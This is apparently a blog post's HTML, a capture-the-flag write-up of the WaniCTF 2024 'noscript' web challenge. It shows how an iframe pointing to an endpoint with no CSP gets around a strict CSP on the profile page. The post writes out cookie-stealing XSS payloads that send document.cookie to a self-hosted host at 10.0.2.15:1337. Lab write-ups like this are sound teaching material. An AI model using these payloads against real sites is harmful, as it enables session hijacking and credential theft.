@@ -1,0 +1,200 @@
+<!DOCTYPE html>
+<html lang="en-us">
+
+<head>
+    <title>
+noscript (web) | Sir_X Blog
+</title>
+
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="">
+<link rel="stylesheet" href="/css/syntax.css">
+
+<meta name="generator" content="Hugo 0.140.2">
+
+
+<link rel="canonical" href="https://sir-xxxx.github.io/posts/noscript/" >
+
+
+
+
+<link href="/css/style.min.b3acfecfd1a336f230974dd0789764352e589f35942d3c00c9a7376c25c883de.css" rel="stylesheet">
+
+
+
+
+</head>
+
+<body>
+
+    <div class="flexWrapper">
+        <header class="headerWrapper">
+    <div class="header">
+        <div>
+            <a class="terminal" href="https://sir-xxxx.github.io/">
+                <span>blog@sir_x.github.io ~ $</span>
+            </a>
+        </div>
+        <input class="side-menu" type="checkbox" id="side-menu">
+        <label class="hamb" for="side-menu"><span class="hamb-line"></span></label>
+        <nav class="headerLinks">
+            <ul>
+                
+                <li>
+                    <a href="https://sir-xxxx.github.io/posts" title="" >
+                        ~/posts</a>
+                </li>
+                
+            </ul>
+        </nav>
+    </div>
+</header>
+
+
+        <div class="content">
+            <main class="main">
+                
+<div class="postWrapper">
+    <h1>noscript (web)</h1>
+    
+    
+    <section class="postMetadata">
+        <dl>
+            
+                
+<dt>tags</dt>
+<dd><span></span>
+    <a href="/tags/web/">#Web</a><span></span>
+    <a href="/tags/xss/">#Xss</a><span></span>
+    <a href="/tags/ctf/">#Ctf</a></dd>
+            
+            
+            
+            
+                <dt>published</dt>
+                
+                <dd><time datetime="2024-06-21">June 21, 2024</time></dd>
+            
+            
+                <dt>reading time</dt>
+                <dd>4 minutes</dd>
+            
+        </dl>
+    </section>
+    
+    <div>
+        <h2 id="description">Description</h2>
+<p>Ignite it to steal the cookie!</p>
+<p><a href="https://wanictf.org/2024/">https://wanictf.org/2024/</a></p>
+<h2 id="solution">Solution</h2>
+<p>Since I decided to join the <a href="https://dombusters.github.io/">DOMBUSTERS</a> team on Discord I&rsquo;ve completed a bunch of ctf challenges. For some of the interesting challenges I have solved I want to create my writeup notes on this blog.<br>
+For this web based challenge the sourcecode of the web application was available. The main application is written in Go and allows users to change their usernames and profiles. The second component called <code>crawler</code> is a bot used to check the users profile. The flag we want to retrieve is set as a cookie in this bots profile lookup call. Therefore we need to find a way for this crawler to send us the cookie when he performs a lookup on a users profile.</p>
+<p>As we can see in the sourcecode of that crawler, it will only call the <code>/user:id</code> path directly. On that page there is a strict CSP (Content Security Policy) set. <code>Content-Security-Policy: &quot;default-src 'self', script-src 'none'&quot;</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="line"><span class="cl"><span class="c1">// Get user profiles
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">r</span><span class="p">.</span><span class="nf">GET</span><span class="p">(</span><span class="s">&#34;/user/:id&#34;</span><span class="p">,</span> <span class="kd">func</span><span class="p">(</span><span class="nx">c</span> <span class="o">*</span><span class="nx">gin</span><span class="p">.</span><span class="nx">Context</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">c</span><span class="p">.</span><span class="nf">Header</span><span class="p">(</span><span class="s">&#34;Content-Security-Policy&#34;</span><span class="p">,</span> <span class="s">&#34;default-src &#39;self&#39;, script-src &#39;none&#39;&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">id</span> <span class="o">:=</span> <span class="nx">c</span><span class="p">.</span><span class="nf">Param</span><span class="p">(</span><span class="s">&#34;id&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">re</span> <span class="o">:=</span> <span class="nx">regexp</span><span class="p">.</span><span class="nf">MustCompile</span><span class="p">(</span><span class="s">&#34;^[a-fA-F0-9]{8}-[a-fA-F0-9]{4}-4[a-fA-F0-9]{3}-[8|9|aA|bB][a-fA-F0-9]{3}-[a-fA-F0-9]{12}$&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="nx">re</span><span class="p">.</span><span class="nf">MatchString</span><span class="p">(</span><span class="nx">id</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="nx">val</span><span class="p">,</span> <span class="nx">ok</span> <span class="o">:=</span> <span class="nx">db</span><span class="p">.</span><span class="nf">Get</span><span class="p">(</span><span class="nx">id</span><span class="p">);</span> <span class="nx">ok</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">params</span> <span class="o">:=</span> <span class="kd">map</span><span class="p">[</span><span class="kt">string</span><span class="p">]</span><span class="kd">interface</span><span class="p">{}{</span>
+</span></span><span class="line"><span class="cl">                <span class="s">&#34;id&#34;</span><span class="p">:</span>       <span class="nx">id</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                <span class="s">&#34;username&#34;</span><span class="p">:</span> <span class="nx">val</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span>
+</span></span><span class="line"><span class="cl">                <span class="s">&#34;profile&#34;</span><span class="p">:</span>  <span class="nx">template</span><span class="p">.</span><span class="nf">HTML</span><span class="p">(</span><span class="nx">val</span><span class="p">[</span><span class="mi">1</span><span class="p">]),</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">c</span><span class="p">.</span><span class="nf">HTML</span><span class="p">(</span><span class="nx">http</span><span class="p">.</span><span class="nx">StatusOK</span><span class="p">,</span> <span class="s">&#34;user.html&#34;</span><span class="p">,</span> <span class="nx">params</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">_</span><span class="p">,</span> <span class="nx">_</span> <span class="p">=</span> <span class="nx">c</span><span class="p">.</span><span class="nx">Writer</span><span class="p">.</span><span class="nf">WriteString</span><span class="p">(</span><span class="s">&#34;&lt;p&gt;user not found &lt;a href=&#39;/&#39;&gt;Home&lt;/a&gt;&lt;/p&gt;&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">_</span><span class="p">,</span> <span class="nx">_</span> <span class="p">=</span> <span class="nx">c</span><span class="p">.</span><span class="nx">Writer</span><span class="p">.</span><span class="nf">WriteString</span><span class="p">(</span><span class="s">&#34;&lt;p&gt;invalid id &lt;a href=&#39;/&#39;&gt;Home&lt;/a&gt;&lt;/p&gt;&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">})</span>
+</span></span></code></pre></div><p>Based on that CSP we know that on the page <code>/user/:id</code> we can not execute any javascript and only include content from self.
+Additionally, the Username parameter is only handled as a string on this page. So we can&rsquo;t inject any html into the users profile using his username.
+Only the profile parameter is handled as html, so we can misuse that one to inject some html that complies with the CSP.</p>
+<p>To make life a bit easier I first update the sourcecode of the crawler a bit, to add some useful debug logs. With those I can see if the console of the chromium logs any errors.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="line"><span class="cl"><span class="kd">const</span> <span class="nx">crawl</span> <span class="p">=</span> <span class="nf">async</span> <span class="p">(</span><span class="nx">path</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kd">const</span> <span class="nx">browser</span> <span class="p">=</span> <span class="nx">await</span> <span class="nx">chromium</span><span class="p">.</span><span class="nf">launch</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">  <span class="kd">const</span> <span class="nx">page</span> <span class="p">=</span> <span class="nx">await</span> <span class="nx">browser</span><span class="p">.</span><span class="nf">newPage</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">  <span class="kd">const</span> <span class="nx">cookie</span> <span class="p">=</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="nx">name</span><span class="p">:</span> <span class="s">&#34;flag&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">      <span class="nx">value</span><span class="p">:</span> <span class="nx">FLAG</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">      <span class="nx">domain</span><span class="p">:</span> <span class="nx">HOST</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">      <span class="nx">path</span><span class="p">:</span> <span class="s">&#34;/&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">      <span class="nx">expires</span><span class="p">:</span> <span class="nx">Date</span><span class="p">.</span><span class="nf">now</span><span class="p">()</span> <span class="o">/</span> <span class="mi">1000</span> <span class="o">+</span> <span class="mi">100000</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="p">},</span>
+</span></span><span class="line"><span class="cl">  <span class="p">];</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">page</span><span class="p">.</span><span class="nf">context</span><span class="p">().</span><span class="nf">addCookies</span><span class="p">(</span><span class="nx">cookie</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="c1">//Log the chromium console
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nx">page</span><span class="p">.</span><span class="nf">on</span><span class="p">(</span><span class="err">&#39;</span><span class="nx">console</span><span class="err">&#39;</span><span class="p">,</span> <span class="nx">message</span> <span class="p">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="s">`Console (${message.type()}): ${message.text()}`</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">});</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">try</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">await</span> <span class="nx">page</span><span class="p">.</span><span class="k">goto</span><span class="p">(</span><span class="nx">APP_URL</span> <span class="o">+</span> <span class="nx">path</span><span class="p">,</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="nx">waitUntil</span><span class="p">:</span> <span class="s">&#34;domcontentloaded&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">      <span class="nx">timeout</span><span class="p">:</span> <span class="mi">3000</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="p">});</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">await</span> <span class="nx">page</span><span class="p">.</span><span class="nf">waitForTimeout</span><span class="p">(</span><span class="mi">1000</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">await</span> <span class="nx">page</span><span class="p">.</span><span class="nb">close</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span> <span class="nf">catch</span> <span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nb">error</span><span class="p">(</span><span class="s">&#34;crawl&#34;</span><span class="p">,</span> <span class="nx">err</span><span class="p">.</span><span class="nx">message</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span> <span class="nx">finally</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">await</span> <span class="nx">browser</span><span class="p">.</span><span class="nb">close</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="s">&#34;crawl&#34;</span><span class="p">,</span> <span class="s">&#34;browser closed&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">};</span>
+</span></span></code></pre></div><p>Since we can&rsquo;t use <code>&lt;script&gt;</code> I tried to load an image from my self hosted server including the cookies.
+Profile: <code>&lt;img src=&quot;http://10.0.2.15:1337/?cookie=&quot;+encodeURIComponent(document.cookie)&gt;</code>
+But because that violates the default-src: self it gets blocked.</p>
+<p>Since the current details are not yet enough to exploit the webapp I once again look trough the sourcecode provided.
+There is another path available that I didn&rsquo;t consider so far. <code>/username/:id</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="line"><span class="cl"><span class="c1">// Get username API
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">r</span><span class="p">.</span><span class="nf">GET</span><span class="p">(</span><span class="s">&#34;/username/:id&#34;</span><span class="p">,</span> <span class="kd">func</span><span class="p">(</span><span class="nx">c</span> <span class="o">*</span><span class="nx">gin</span><span class="p">.</span><span class="nx">Context</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">ipAddress</span> <span class="o">:=</span> <span class="nx">c</span><span class="p">.</span><span class="nf">ClientIP</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">fmt</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="s">&#34;Caller IP:&#34;</span><span class="p">,</span> <span class="nx">ipAddress</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="nx">id</span> <span class="o">:=</span> <span class="nx">c</span><span class="p">.</span><span class="nf">Param</span><span class="p">(</span><span class="s">&#34;id&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">re</span> <span class="o">:=</span> <span class="nx">regexp</span><span class="p">.</span><span class="nf">MustCompile</span><span class="p">(</span><span class="s">&#34;^[a-fA-F0-9]{8}-[a-fA-F0-9]{4}-4[a-fA-F0-9]{3}-[8|9|aA|bB][a-fA-F0-9]{3}-[a-fA-F0-9]{12}$&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="nx">re</span><span class="p">.</span><span class="nf">MatchString</span><span class="p">(</span><span class="nx">id</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="nx">val</span><span class="p">,</span> <span class="nx">ok</span> <span class="o">:=</span> <span class="nx">db</span><span class="p">.</span><span class="nf">Get</span><span class="p">(</span><span class="nx">id</span><span class="p">);</span> <span class="nx">ok</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="nx">_</span><span class="p">,</span> <span class="nx">_</span> <span class="p">=</span> <span class="nx">c</span><span class="p">.</span><span class="nx">Writer</span><span class="p">.</span><span class="nf">WriteString</span><span class="p">(</span><span class="nx">val</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="nx">_</span><span class="p">,</span> <span class="nx">_</span> <span class="p">=</span> <span class="nx">c</span><span class="p">.</span><span class="nx">Writer</span><span class="p">.</span><span class="nf">WriteString</span><span class="p">(</span><span class="s">&#34;&lt;p&gt;user not found &lt;a href=&#39;/&#39;&gt;Home&lt;/a&gt;&lt;/p&gt;&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">_</span><span class="p">,</span> <span class="nx">_</span> <span class="p">=</span> <span class="nx">c</span><span class="p">.</span><span class="nx">Writer</span><span class="p">.</span><span class="nf">WriteString</span><span class="p">(</span><span class="s">&#34;&lt;p&gt;invalid id &lt;a href=&#39;/&#39;&gt;Home&lt;/a&gt;&lt;/p&gt;&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">})</span>
+</span></span></code></pre></div><p>The sourcecode of this endpoint shows that there is no CSP in place here. Therefore if the username can be updated to contain some javascript it should get executed on this path.
+As can be seen in the screenshot updating the username and calling it on this subpage reflects the XSS back to us.</p>
+<p><img src="/noscript.png" alt="NoScript"></p>
+<p>Now all we have left to do is to get the bot crawler to access our prepared page that reflects the javascript stored in the username. But since the new endpoint is on the same webpage there should be no issue with the CSP of <code>self</code>.
+The first attempt was to use the <code>img</code> tag. In the logs we can see that a GET request is made to the username path. But the XSS is not executed. Probably because the XSS Payload was never actually loaded into the chromium instance of the crawler.
+Therefore the next tag used was <code>iframe</code>. With this we can see that we actually get a request back from the crawler, including his cookies.</p>
+<p>Username: <code>&lt;script&gt;fetch('http://10.0.2.15:1337/'+document.cookie)&lt;/script&gt;</code><br>
+Profile: <code>&lt;iframe src=&quot;/username/f7754cd5-29be-4322-88d0-4749bb7724da&quot;&gt;&lt;/iframe&gt;</code></p>
+
+    </div>
+</div>
+
+            </main>
+        </div>
+
+
+        <footer class="footer">
+    
+        <span>
+            © 2025 Sir_X Blog, Built with
+            <a href="https://gohugo.io" class="footerLink">Hugo</a> and
+            <a href="https://github.com/LordMathis/hugo-theme-nightfall" class="footerLink">Nightfall</a> theme
+        </span>
+    
+</footer>
+    </div>
+
+</body>
+
+</html>
